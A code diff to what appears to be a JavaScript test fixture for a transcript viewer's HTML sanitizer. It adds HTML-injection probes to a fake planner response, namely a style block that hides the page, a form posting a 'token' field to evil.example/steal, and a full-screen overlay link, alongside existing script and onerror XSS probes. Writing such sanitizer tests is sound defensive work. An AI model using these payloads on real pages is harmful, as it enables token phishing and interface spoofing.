@@ -139,7 +139,15 @@ function buildSessions(configPath) {
           type: "PLANNER_RESPONSE",
           thinking: 'Thinking with <script>window.__xss=2</script> inside.',
           content:
-            'Done. <script>window.__xss=3</script> And an <img src=x onerror="window.__xss=4"> image.',
+            'Done. <script>window.__xss=3</script> And an <img src=x onerror="window.__xss=4"> image.\n\n' +
+            // No script runs from these, but DOMPurify's defaults would let them through: a <style>
+            // block is not scoped to the transcript and can restyle or hide the app's own chrome,
+            // and a <form> rendered in the trusted origin next to the real API-token prompt is
+            // enough to make a convincing fake one. A style attribute is the overlay vector.
+            '<style>body{display:none}</style>\n' +
+            '<form id="xss-form" action="https://evil.example/steal" method="POST">' +
+            '<input name="token"><button>Unlock</button></form>\n' +
+            '<a id="xss-overlay" href="#" style="position:fixed;inset:0;z-index:9999">covered</a>',
           tool_calls: [
             {
               name: '<img src=x onerror="window.__xss=5">',
